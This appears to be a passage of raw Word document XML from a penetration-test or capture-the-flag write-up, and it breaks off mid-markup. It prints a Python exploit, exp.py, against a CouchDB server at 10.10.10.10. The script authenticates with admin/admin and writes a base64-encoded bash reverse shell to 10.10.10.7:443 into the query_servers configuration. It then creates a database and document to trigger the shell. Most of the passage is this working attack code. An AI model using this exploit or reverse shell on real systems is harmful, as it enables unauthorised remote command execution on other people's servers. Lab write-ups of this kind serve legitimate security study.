          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Run: </w:t>
      </w:r>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python3 exp.py</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The code in exp.py:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#!/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> python3</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import requests</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import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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import base64</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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>requests.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTPBasicAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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target = 'http://10.10.10.10:5984'</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command = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rb</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sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&amp; /dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/10.10.10.7/443 0&gt;&amp;1"""</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version = 1</w:t>
      </w:r>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session = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>requests.session</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRPr="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.headers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = {</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    'Content-Type': 'application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'</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w:t>
      </w:r>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print('hi')</w:t>
      </w:r>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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTPBasicAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>('admin', 'admin')</w:t>
      </w:r>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print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>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command = "bash -c '{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>echo,%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}|{base64,-d}|{bash,-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}'" % base64.b64encode(command).decode()</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if version == 1:</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + ('/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>config</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query_servers</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'), data=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json.dumps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(command))</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else:</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    host = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/_membership').</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</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all_nodes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'][0]</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/_node/{}/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>config</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query_servers</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'.format(host), data=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json.dumps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(command))</w:t>
      </w:r>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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRPr="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/test', data='{"_id": "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyuntest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRPr="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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lastRenderedPageBreak/>
        <w:t>if version == 1:</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
